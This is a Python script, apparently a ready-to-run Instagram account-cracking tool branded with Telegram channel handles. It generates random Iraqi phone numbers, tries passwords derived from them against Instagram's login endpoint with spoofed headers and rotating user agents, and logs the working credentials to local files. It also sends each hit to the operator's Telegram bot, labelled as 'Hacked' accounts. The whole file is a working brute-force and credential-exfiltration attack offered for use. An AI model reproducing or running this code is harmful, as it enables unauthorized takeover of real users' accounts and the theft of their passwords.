import requests
import requests
import sys,os
import random,os,sys
import requests
import time
from time import sleep
from user_agent import generate_user_agent
import pyfiglet
from colorama import Fore, init
banner = pyfiglet.figlet_format("Instagram")

#---------------{الوان}-------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

r = requests.session()
token = input("Enter Token Bot : ")
ID = input("Enter iD Tele : ")
start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=START HACK...🔥").json()
id_msg =(start_msg['result']["message_id"])

def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)

def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
def error():
	while True:	
	       print('')		
		
os.system('clear')
print(Fore.YELLOW + banner)
print (H+"[1] START CHECKER ")
print (C+"[0] EXIT ")
sidra = input(A+"[~] CHOOSE AN OPTION : "+C)
USER_1 = "0123456789"
if sidra == '1':
	print('\033[1;95m--------------------------------------\033[1;92m') 
	Ok = 0
	Cp = 0
	Do = 0
	Eo = 0
	while True:
		USER_2 = str(''.join((random.choice(USER_1) for i in range(8))))
		emi = "+96477"+USER_2
		pw = "077"+USER_2
		PASS2 = "Bangladesh"
		PASS3 = "786786"
		Url="https://www.instagram.com/accounts/login/ajax/"
		
		payload = {
		                'username':emi,
                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(pw),
                        'queryParams': '{}',
                        'optIntoOneTap': 'false',}

		headers = {

     'accept':'*/*',

    'accept-encoding':'gzip,deflate,br',

    'accept-language':'en-US,en;q=0.9,ar;q=0.8',

    'content-length':'269',

    'content-type':'application/x-www-form-urlencoded',

    'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',

    'origin':'https://www.instagram.com',

    'referer':'https://www.instagram.com/',

    'sec-fetch-dest':'empty',

    'sec-fetch-mode':'cors',

    'sec-fetch-site':'same-origin',

    'user-agent': generate_user_agent(),

    'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',

    'x-ig-app-id':'936619743392459',

    'x-ig-www-claim':'0',

    'x-instagram-ajax':'8a8118fa7d40',

    'x-requested-with':'XMLHttpRequest',

                }
		req = r.post(Url,headers=headers,data=payload)
		if ("userId") in req.text:
			Ok+=1
			Do+=1
			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Hi Check Instagram Accounts ✅ ⁦✰︎\n-----------------------------------------\n✥ Hacked ✅ : {Do}\n\n✥ Scure 🔐 : {Cp}\n-----------------------------------------\n✥ Start Hack 🔥 : {Ok}\n-----------------------------------------\n✥ E𝗆𝖺𝗂𝗅 📧 : {emi}\n\n✥ Pass 🔐 : {pw} \n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi")
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hi New Hacked Instagram ✓\n-----------------------------------------\n✥ E𝗆𝖺𝗂𝗅 📧 : {emi} \n✥ Pass 🔐 : {pw} \n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi")
			with open("OK.txt",'a') as ff:
				ff.write(f"USERNAME : {emi}\nPASSPWRD : {pw}\n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi\n\n\n")
		elif ("checkpoint_url")  in req.text:
			Ok+=1
			Cp+=1
			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Hi Check Instagram Accounts ✅ ⁦✰︎\n-----------------------------------------\n✥ Hacked ✅ : {Do}\n\n✥ Scure 🔐 : {Cp}\n-----------------------------------------\n✥ Start Hack 🔥 : {Ok}\n-----------------------------------------\n✥ E𝗆𝖺𝗂𝗅 📧 : {emi}\n\n✥ Pass 🔐 : {pw}\n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi")
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Accounts Scure 🔐⁦ ✰︎\n-----------------------------------------\n✥ E𝗆𝖺𝗂𝗅 📧 : {emi}\n✥ Pass 🔐 : {pw}\n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi")
			
			with open("CP.txt",'a') as ff:
				ff.write(f"USERNAME : {emi}\nPASSPWRD : {pw}\n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi\n\n\n")
		else:
			Ok+=1
			Eo+=1
			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Hi Check Instagram Accounts ✅ ⁦✰︎\n-----------------------------------------\n✥ Hacked ✅ : {Do}\n\n✥ Scure 🔐 : {Cp}\n-----------------------------------------\n✥ Start Hack 🔥 : {Ok}\n-----------------------------------------\n✥ E𝗆𝖺𝗂𝗅 📧 : {emi}\n\n✥ Pass 🔐 : {pw}\n-----------------------------------------\n✥ CH : @ZZBoTs Tele : @PiPPi")
			
			
	